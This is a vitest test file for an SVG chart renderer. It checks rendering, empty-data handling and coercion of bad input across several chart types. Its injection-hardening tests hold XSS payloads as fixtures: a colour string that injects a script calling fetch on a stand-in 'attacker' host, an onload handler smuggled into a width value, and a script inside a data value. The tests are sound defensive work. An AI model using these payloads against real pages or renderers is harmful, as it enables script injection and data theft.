/* eslint-disable testing-library/render-result-naming-convention */
import { describe, it, expect } from 'vitest';
import { renderChartSvg, type ChartRendererInput } from './chartRenderer';

// ── Helpers ───────────────────────────────────────────────────────────────────

function isSvg(s: string): boolean {
  return s.trimStart().startsWith('<svg') && s.includes('</svg>');
}

function countTag(svg: string, tag: string): number {
  return (svg.match(new RegExp(`<${tag}[\\s/>]`, 'g')) ?? []).length;
}

const SIMPLE_DATA = [
  { label: 'A', value: 10 },
  { label: 'B', value: 25 },
  { label: 'C', value: 15 },
];

// ── Bar chart ─────────────────────────────────────────────────────────────────

describe('renderChartSvg — bar', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders one rect per data point', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    expect(countTag(svg, 'rect')).toBe(SIMPLE_DATA.length);
  });

  it('includes the title when provided', () => {
    const svg = renderChartSvg({ type: 'bar', title: 'My Bar Chart', data: SIMPLE_DATA });
    expect(svg).toContain('My Bar Chart');
  });

  it('includes axis lines', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA });
    // Two axis lines (x and y)
    expect(countTag(svg, 'line')).toBeGreaterThanOrEqual(2);
  });

  it('respects custom dimensions', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA, width: 800, height: 500 });
    expect(svg).toContain('width="800"');
    expect(svg).toContain('height="500"');
  });

  it('uses custom colors', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: ['#ff0000', '#00ff00', '#0000ff'],
    });
    expect(svg).toContain('#ff0000');
    expect(svg).toContain('#00ff00');
  });

  it('handles a single data point', () => {
    const svg = renderChartSvg({ type: 'bar', data: [{ label: 'Only', value: 42 }] });
    expect(isSvg(svg)).toBe(true);
    expect(countTag(svg, 'rect')).toBe(1);
  });

  it('escapes HTML special characters in labels', () => {
    const svg = renderChartSvg({ type: 'bar', data: [{ label: '<script>', value: 1 }] });
    expect(svg).not.toContain('<script>');
    expect(svg).toContain('&lt;script&gt;');
  });
});

// ── Line chart ────────────────────────────────────────────────────────────────

describe('renderChartSvg — line', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders a polyline element', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(countTag(svg, 'polyline')).toBeGreaterThanOrEqual(1);
  });

  it('renders dots (circles) for each data point', () => {
    const svg = renderChartSvg({ type: 'line', data: SIMPLE_DATA });
    expect(countTag(svg, 'circle')).toBe(SIMPLE_DATA.length);
  });

  it('supports multi-series with xLabels + series', () => {
    const svg = renderChartSvg({
      type: 'line',
      title: 'Multi-series',
      xLabels: ['Q1', 'Q2', 'Q3'],
      series: [
        { name: 'Product A', values: [100, 150, 130] },
        { name: 'Product B', values: [80, 90, 120] },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(countTag(svg, 'polyline')).toBe(2);
    expect(svg).toContain('Product A');
    expect(svg).toContain('Product B');
  });

  it('renders a legend for multi-series charts', () => {
    const svg = renderChartSvg({
      type: 'line',
      xLabels: ['Jan', 'Feb'],
      series: [
        { name: 'Series1', values: [1, 2] },
        { name: 'Series2', values: [3, 4] },
      ],
    });
    expect(svg).toContain('Series1');
    expect(svg).toContain('Series2');
  });

  it('falls back gracefully when no data is provided', () => {
    const svg = renderChartSvg({ type: 'line' });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
  });
});

// ── Pie chart ─────────────────────────────────────────────────────────────────

describe('renderChartSvg — pie', () => {
  it('returns valid SVG markup', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(isSvg(svg)).toBe(true);
  });

  it('renders one path (slice) per data point', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(countTag(svg, 'path')).toBe(SIMPLE_DATA.length);
  });

  it('includes label text in the legend', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    for (const d of SIMPLE_DATA) {
      expect(svg).toContain(d.label);
    }
  });

  it('includes percentage in the legend', () => {
    const svg = renderChartSvg({ type: 'pie', data: SIMPLE_DATA });
    expect(svg).toContain('%');
  });

  it('includes the title when provided', () => {
    const svg = renderChartSvg({ type: 'pie', title: 'Market Share', data: SIMPLE_DATA });
    expect(svg).toContain('Market Share');
  });

  it('skips zero-value slices', () => {
    const data = [
      { label: 'A', value: 10 },
      { label: 'B', value: 0 },
      { label: 'C', value: 20 },
    ];
    const svg = renderChartSvg({ type: 'pie', data });
    // Only 2 non-zero slices
    expect(countTag(svg, 'path')).toBe(2);
  });

  it('renders the "No data provided." placeholder for empty data (finding T3-2)', () => {
    const svg = renderChartSvg({ type: 'pie', data: [] });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
  });

  it('renders the "No data provided." placeholder for all-non-positive data (finding T3-2)', () => {
    const svg = renderChartSvg({
      type: 'pie',
      data: [
        { label: 'A', value: 0 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    // No slice paths rendered.
    expect(countTag(svg, 'path')).toBe(0);
  });

  it('renders a visible full circle for a single positive slice (finding 3.2)', () => {
    // A single 100% slice yields `slice = 360°`; the collapsed arc would drop the
    // body and leave only the "100%" label/legend. The body must be a full circle.
    const svg = renderChartSvg({ type: 'pie', data: [{ label: 'Only', value: 42 }] });
    expect(isSvg(svg)).toBe(true);
    // Legend swatches are <rect>, so the only <circle> is the chart body.
    expect(countTag(svg, 'circle')).toBe(1);
    // No collapsed slice path was emitted for the single-slice body.
    expect(countTag(svg, 'path')).toBe(0);
    expect(svg).toContain('100%');
  });
});

// ── Donut chart ───────────────────────────────────────────────────────────────

describe('renderChartSvg — donut', () => {
  it('renders a visible ring for a single positive slice, preserving the hole (finding 3.2)', () => {
    // A single 100% slice yields `slice = 360°`; the collapsed wedge path would drop
    // the body and leave only the "100%" label/legend + centre total. The body must
    // be a full ring (fill-rule="evenodd" punches the donut hole).
    const svg = renderChartSvg({ type: 'donut', data: [{ label: 'Only', value: 42 }] });
    expect(isSvg(svg)).toBe(true);
    // A filled body path is present (not just label/legend text).
    expect(countTag(svg, 'path')).toBe(1);
    // The evenodd ring preserves the donut hole rather than a solid disc.
    expect(svg).toContain('fill-rule="evenodd"');
    expect(svg).toContain('100%');
  });
});

// ── Error handling ────────────────────────────────────────────────────────────

describe('renderChartSvg — errors', () => {
  it('throws for an unknown chart type', () => {
    expect(() => renderChartSvg({ type: 'radar' as never })).toThrow(/unknown chart type/i);
  });
});

// ── Security: attribute/markup injection (finding 1.3) ──────────────────────────

describe('renderChartSvg — injection hardening', () => {
  const POISONED_COLOR = 'red" /><script>fetch("https://attacker/x")</script><rect fill="red';

  it('drops a poisoned colors entry so no <script> can be injected', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: [POISONED_COLOR],
    });
    // The dangerous markup must be entirely absent from the output — not merely
    // re-escaped. The poisoned fill is replaced with a safe default color.
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain('</script>');
    expect(svg).not.toContain('fetch(');
    expect(svg).not.toContain(POISONED_COLOR);
    // A valid default hex color is used in its place.
    expect(svg).toMatch(/fill="#[0-9a-fA-F]{3,8}"/);
  });

  it('sanitizes poisoned colors across every chart type', () => {
    const inputs: ChartRendererInput[] = [
      { type: 'bar', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'line', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'pie', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      { type: 'donut', data: SIMPLE_DATA, colors: [POISONED_COLOR] },
      {
        type: 'scatter',
        data: [
          { label: '1', value: 5 },
          { label: '2', value: 8 },
        ],
        colors: [POISONED_COLOR],
      },
      {
        type: 'stacked_bar',
        xLabels: ['Q1', 'Q2'],
        series: [{ name: 'A', values: [1, 2] }],
        colors: [POISONED_COLOR],
      },
    ];
    for (const input of inputs) {
      const svg = renderChartSvg(input);
      expect(svg, `chart type ${input.type}`).not.toContain('<script');
      expect(svg, `chart type ${input.type}`).not.toContain('fetch(');
      expect(svg, `chart type ${input.type}`).not.toContain(POISONED_COLOR);
    }
  });

  it('keeps valid hex colors and replaces only the poisoned entry', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      colors: ['#ff0000', POISONED_COLOR, '#0000ff'],
    });
    // Valid entries survive.
    expect(svg).toContain('#ff0000');
    expect(svg).toContain('#0000ff');
    // The poisoned entry is gone; a safe default takes its slot (index 1).
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain(POISONED_COLOR);
    expect(svg).toContain('#f28e2b'); // DEFAULT_COLORS[1]
  });

  // Regression for T3-A: an empty `colors: []` used to survive `sanitizeColors` as `[]`,
  // slipping past each renderer's `colors = DEFAULT_COLORS` default (which only fires for
  // `undefined`). Then `color([], i)` → `[][NaN]` → `undefined` → `fill="undefined"`.
  it('treats an empty colors array as absent and falls back to DEFAULT_COLORS', () => {
    const inputs: ChartRendererInput[] = [
      { type: 'bar', data: SIMPLE_DATA, colors: [] },
      { type: 'line', data: SIMPLE_DATA, colors: [] },
      { type: 'pie', data: SIMPLE_DATA, colors: [] },
      { type: 'donut', data: SIMPLE_DATA, colors: [] },
      {
        type: 'stacked_bar',
        xLabels: ['Q1', 'Q2'],
        series: [{ name: 'A', values: [1, 2] }],
        colors: [],
      },
    ];
    for (const input of inputs) {
      const svg = renderChartSvg(input);
      expect(svg, `chart type ${input.type}`).not.toContain('fill="undefined"');
      expect(svg, `chart type ${input.type}`).toContain('#4e79a7'); // DEFAULT_COLORS[0]
    }
  });

  it('falls back to default dimensions for a non-numeric width/height', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      width: '600" onload="alert(1)' as unknown as number,
      height: Number.NaN,
    });
    expect(svg).toContain('width="600"');
    expect(svg).toContain('height="400"');
    expect(svg).not.toContain('onload');
  });

  it('falls back to default dimensions for absurdly large values', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: SIMPLE_DATA,
      width: 10 ** 12,
      height: -50,
    });
    expect(svg).toContain('width="600"');
    expect(svg).toContain('height="400"');
    expect(svg).not.toContain('1000000000000');
  });

  it('still honors valid custom dimensions', () => {
    const svg = renderChartSvg({ type: 'bar', data: SIMPLE_DATA, width: 800, height: 500 });
    expect(svg).toContain('width="800"');
    expect(svg).toContain('height="500"');
  });

  it('coerces a string data value so the donut centre total cannot inject markup', () => {
    // `value` is typed `number` but never validated at runtime. A string value
    // previously flowed into `total.toLocaleString()` as raw text content.
    const svg = renderChartSvg({
      type: 'donut',
      title: 'ok',
      data: [{ label: 'x', value: '5</text><script>alert(1)</script>' as unknown as number }],
    });
    expect(svg).not.toContain('<script');
    expect(svg).not.toContain('</script>');
    expect(svg).not.toContain('alert(1)');
  });

  it('coerces a non-numeric bar value to 0 rather than producing NaN geometry', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: [
        { label: 'A', value: 10 },
        { label: 'B', value: 'not-a-number' as unknown as number },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).not.toContain('NaN');
  });

  it('does not throw on a non-array colors value (coerces to defaults)', () => {
    // `colors` is typed `string[]` but is model-supplied and never validated; a
    // non-array value previously threw a raw `TypeError` inside `.map` on the public
    // `renderChartSvg` export (finding 2.1).
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'bar',
        data: SIMPLE_DATA,
        colors: '#fff' as unknown as string[],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    // Falls back to the default palette.
    expect(svg).toContain('#4e79a7'); // DEFAULT_COLORS[0]
  });

  it('does not throw on a non-array data value (renders the No-data placeholder)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({ type: 'bar', data: {} as unknown as ChartRendererInput['data'] });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
  });

  it('does not throw on a non-array series value', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'stacked_bar',
        xLabels: ['Q1', 'Q2'],
        series: 'x' as unknown as ChartRendererInput['series'],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
  });
});

// ── No-data / all-non-positive guards (finding 3.3) ─────────────────────────────

describe('renderChartSvg — empty / non-positive data guards', () => {
  it('renders a "No data" placeholder for a bar chart with no data points', () => {
    const svg = renderChartSvg({ type: 'bar', data: [] });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a bar chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'bar',
      data: [
        { label: 'A', value: 0 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a donut chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'donut',
      data: [
        { label: 'A', value: 0 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });
});

// ── NaN/Infinity geometry guards for line/stacked_bar/scatter/pie/donut (T2-2) ──
//
// finding 2.2: the all-non-positive guard existed for bar/donut, but line (both
// paths), stacked_bar, and scatter divided by a 0 max → NaN coordinates, and
// pie/donut summed negatives into `total` → Infinity/negative arcs for mixed-sign
// data. None of these are an injection risk, but NaN/Infinity attributes dead-end
// the render (image viewers reject the SVG).

describe('renderChartSvg — NaN/Infinity geometry guards (T2-2)', () => {
  it('renders a "No data" placeholder for a multi-series line chart with all-zero values', () => {
    const svg = renderChartSvg({
      type: 'line',
      xLabels: ['Jan', 'Feb'],
      series: [{ name: 'delta', values: [0, 0] }],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a single-series line chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'line',
      data: [
        { label: 'Jan', value: 0 },
        { label: 'Feb', value: -3 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a stacked_bar chart with all-non-positive values', () => {
    const svg = renderChartSvg({
      type: 'stacked_bar',
      xLabels: ['Q1', 'Q2'],
      series: [
        { name: 'A', values: [0, 0] },
        { name: 'B', values: [-1, -2] },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('renders a "No data" placeholder for a scatter chart with all-non-positive y values', () => {
    const svg = renderChartSvg({
      type: 'scatter',
      data: [
        { label: '1', value: 0 },
        { label: '2', value: -4 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('No data provided');
    expect(svg).not.toContain('NaN');
  });

  it('does not emit Infinity/NaN arc geometry for a mixed-sign pie chart', () => {
    const svg = renderChartSvg({
      type: 'pie',
      data: [
        { label: 'A', value: 10 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).not.toContain('NaN');
    expect(svg).not.toContain('Infinity');
    // Only the positive slice is drawn — and since the dropped negative leaves it as
    // the lone 100% slice, its body renders as a full circle rather than a collapsed
    // 360° arc (finding 3.2). Legend swatches are <rect>, so this <circle> is the body.
    expect(countTag(svg, 'circle')).toBe(1);
    expect(countTag(svg, 'path')).toBe(0);
  });

  it('does not emit Infinity/NaN arc geometry for a mixed-sign donut chart', () => {
    const svg = renderChartSvg({
      type: 'donut',
      data: [
        { label: 'A', value: 10 },
        { label: 'B', value: -5 },
      ],
    });
    expect(isSvg(svg)).toBe(true);
    expect(svg).not.toContain('NaN');
    expect(svg).not.toContain('Infinity');
    expect(countTag(svg, 'path')).toBe(1);
  });
});

// ── Non-string text field coercion (finding T2-5) ────────────────────────────
//
// `xLabels` entries and series/`data` `name`/`label` values are declared
// `string` in the `render_chart` schema but are model-supplied and never
// validated at runtime — a model routinely emits a bare number (e.g. a year)
// instead of a string. Before this fix, `esc()` called `.replace` on the raw
// value and threw a `TypeError` for anything non-string, dead-ending the
// whole chart render instead of just coercing that one value.

describe('renderChartSvg — non-string text field coercion (T2-5)', () => {
  it('coerces a numeric data label to a string instead of throwing (bar)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'bar',
        data: [{ label: 2024 as unknown as string, value: 10 }],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('>2024<');
  });

  it('coerces a numeric xLabels entry to a string instead of throwing (line, single-series)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'line',
        data: [
          { label: 2021 as unknown as string, value: 5 },
          { label: 2022 as unknown as string, value: 8 },
        ],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('>2021<');
    expect(svg).toContain('>2022<');
  });

  it('coerces numeric xLabels entries and a numeric series name to strings instead of throwing (line, multi-series)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'line',
        xLabels: [2021, 2022, 2023] as unknown as string[],
        series: [
          { name: 2024 as unknown as string, values: [1, 2, 3] },
          { name: 'Actual', values: [4, 5, 6] },
        ],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('>2021<');
    expect(svg).toContain('>2022<');
    expect(svg).toContain('>2023<');
    // Numeric series name is coerced and rendered in the legend.
    expect(svg).toContain('2024');
  });

  it('coerces a numeric data label to a string instead of throwing (pie)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'pie',
        data: [
          { label: 2021 as unknown as string, value: 10 },
          { label: 2022 as unknown as string, value: 20 },
        ],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('2021');
    expect(svg).toContain('2022');
  });

  it('coerces a numeric data label to a string instead of throwing (donut)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'donut',
        data: [
          { label: 2021 as unknown as string, value: 10 },
          { label: 2022 as unknown as string, value: 20 },
        ],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('2021');
    expect(svg).toContain('2022');
  });

  it('coerces a numeric data label to a string instead of throwing (scatter)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'scatter',
        data: [
          { label: 1 as unknown as string, value: 5 },
          { label: 2 as unknown as string, value: 8 },
        ],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
  });

  it('coerces numeric xLabels entries and a numeric series name to strings instead of throwing (stacked_bar)', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'stacked_bar',
        xLabels: [2021, 2022] as unknown as string[],
        series: [{ name: 2024 as unknown as string, values: [1, 2] }],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('>2021<');
    expect(svg).toContain('>2022<');
    expect(svg).toContain('2024');
  });

  it('coerces a numeric title to a string instead of throwing', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'bar',
        title: 2024 as unknown as string,
        data: SIMPLE_DATA,
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
    expect(svg).toContain('2024');
  });

  it('coerces a null/undefined data label to an empty string rather than throwing', () => {
    let svg = '';
    expect(() => {
      svg = renderChartSvg({
        type: 'bar',
        data: [{ label: null as unknown as string, value: 5 }],
      });
    }).not.toThrow();
    expect(isSvg(svg)).toBe(true);
  });

  it('still escapes HTML special characters in a coerced numeric-then-string label', () => {
    // Regression guard: coercion must not bypass the existing esc() escaping.
    const svg = renderChartSvg({
      type: 'bar',
      data: [{ label: '<script>2024</script>', value: 1 }],
    });
    expect(svg).not.toContain('<script>');
    expect(svg).toContain('&lt;script&gt;');
  });
});
